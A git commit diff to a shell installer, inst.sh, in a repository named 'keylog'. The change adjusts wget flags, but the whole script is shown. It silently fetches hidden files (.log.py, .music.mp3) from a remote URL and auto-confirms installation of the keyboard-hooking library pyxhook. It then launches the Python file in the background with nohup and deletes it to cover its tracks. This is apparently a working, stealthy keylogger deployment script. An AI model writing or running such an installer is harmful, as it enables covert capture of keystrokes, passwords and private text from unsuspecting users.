5981cf61adba9939a4a974e6f59c16f98bf35e16
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-13 04:29:43 +0000

    Update wget commands to avoid overwriting files

--- inst.sh
+++ inst.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
-wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py .log.py
-wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3 .music.mp3
+wget -q -nc https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py
+wget -q -nc https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3
 yes | pip3 install pyxhook pygame 
 nohup python3 .log.py &
 rm .log.py
